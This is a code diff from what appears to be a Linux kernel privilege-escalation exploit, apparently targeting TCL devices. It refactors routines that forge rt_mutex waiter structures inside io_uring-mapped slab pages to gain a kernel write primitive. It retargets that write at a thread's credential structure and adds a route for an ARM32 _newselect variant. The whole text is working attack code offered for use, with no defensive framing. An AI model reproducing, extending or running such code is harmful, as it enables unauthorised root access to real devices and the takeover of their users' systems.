@@ -107,22 +107,9 @@ int ghost_plan_count(void) {
  * after the first walk, so write the plan into EVERY SQE mapping - only
  * the mapping that backs the mm page is live for the kernel. */
 extern uintptr_t g_consumer_task;
-void ghost_apply_next_plan(int completed_walks) {
-  int next = completed_walks + 1;
-  if (!g_write_plans_active || next >= g_write_plan_count) return;
-  if (uring_count == 0) return;
-  struct ghost_write_plan *pl = &g_write_plans[next];
-  uintptr_t pc = pl->pc;
-  /* In cred mode, walk 1 targets the CONSUMER thread's cred (the consumer
-   * can make syscalls post-walk, unlike the main thread). Override the
-   * plan's target if the consumer leaked its own task. */
-  if (write_mode_is_cred(pselect_custom_write) && g_consumer_task) {
-    pc = (g_consumer_task + TASK_CRED_OFF - 8) | 1;
-    char m[96];
-    int n = snprintf(m, sizeof(m), "[PLAN] retarget walk 1 -> consumer cred %016lx\n",
-                     (unsigned long)(g_consumer_task + TASK_CRED_OFF));
-    write(1, m, n);
-  }
+static int ghost_rearm_captured_raw(uintptr_t pc, uintptr_t rb_right) {
+  if (uring_count == 0) return 0;
+  int armed = 0;
   for (int m = 0; m < uring_count && m < URING_MAX; m++) {
     size_t mapsz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
     if (mapsz < MM_SLAB_SIZE)
@@ -132,7 +119,7 @@ void ghost_apply_next_plan(int completed_walks) {
       uint8_t *page = (uint8_t *)uring_maps[m] + blk * MM_SLAB_SIZE;
       /* Re-arm pi_tree_entry for the write primitive */
       put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, pc);
-      put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 8, pl->rb_right);
+      put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 8, rb_right);
       put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 16, 0);
       /* Re-arm tree_entry (lock->waiters tree node) */
       put64(page, W0_OFF + 0x00, 0);             /* tree_entry.pc = black root */
@@ -159,8 +146,38 @@ void ghost_apply_next_plan(int completed_walks) {
       put32(page, W0_OFF + FAKE_WAITER_PRIO_OFF, 139);
       /* Reset W0.task to fake_task (walk 0 might have changed it) */
       put64(page, W0_OFF + FAKE_WAITER_TASK_OFF, fake_task);
+      /* Restore the identity checked by rt_mutex_top_waiter().  A completed
+       * walk leaves this field outside the rb-tree writes, but treating it as
+       * persistent made retries depend on stale slab contents. */
+      put64(page, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      armed++;
     }
   }
+  atomic_thread_fence(memory_order_seq_cst);
+  return armed > 0;
+}
+
+int ghost_rearm_captured_write(uintptr_t target, uintptr_t value) {
+  if (target < 8) return 0;
+  return ghost_rearm_captured_raw((target - 8) | 1, value);
+}
+
+void ghost_apply_next_plan(int completed_walks) {
+  int next = completed_walks + 1;
+  if (!g_write_plans_active || next >= g_write_plan_count) return;
+  struct ghost_write_plan *pl = &g_write_plans[next];
+  uintptr_t pc = pl->pc;
+  /* In cred mode, walk 1 targets the CONSUMER thread's cred (the consumer
+   * can make syscalls post-walk, unlike the main thread). Override the
+   * plan's target if the consumer leaked its own task. */
+  if (write_mode_is_cred(pselect_custom_write) && g_consumer_task) {
+    pc = (g_consumer_task + TASK_CRED_OFF - 8) | 1;
+    char m[96];
+    int n = snprintf(m, sizeof(m), "[PLAN] retarget walk 1 -> consumer cred %016lx\n",
+                     (unsigned long)(g_consumer_task + TASK_CRED_OFF));
+    write(1, m, n);
+  }
+  (void)ghost_rearm_captured_raw(pc, pl->rb_right);
 }
 
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
@@ -1272,6 +1289,12 @@ static void do_tcl_v643_mcast_compat_route(void) {
   pr_warning("TCL MCAST route requires the not-yet-integrated AArch32 waiter/helper; refusing AArch64 fallback\n");
 }
 
+static void do_tcl_v643_newselect_compat_route(void) {
+  cfi_last_step = 138;
+  cfi_last_errno = ENOTSUP;
+  pr_warning("TCL _newselect route is owned by the split-ABI coordinator; refusing same-process fallback\n");
+}
+
 void do_pselect_fake_lock_route(void) {
   if (active_offsets &&
       active_offsets->stack_overlay_route ==
@@ -1295,6 +1318,18 @@ void do_pselect_fake_lock_route(void) {
       return;
     }
     do_tcl_v643_mcast_compat_route();
+    return;
+  }
+  if (active_offsets &&
+      active_offsets->stack_overlay_route ==
+          GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT) {
+    if (active_offsets->analysis_only) {
+      cfi_last_step = 129;
+      cfi_last_errno = EPERM;
+      pr_warning("TCL _newselect ARM32 route refused: analysis-only profile\n");
+      return;
+    }
+    do_tcl_v643_newselect_compat_route();
     return;
   }
   do_seqpacket_fake_lock_route();
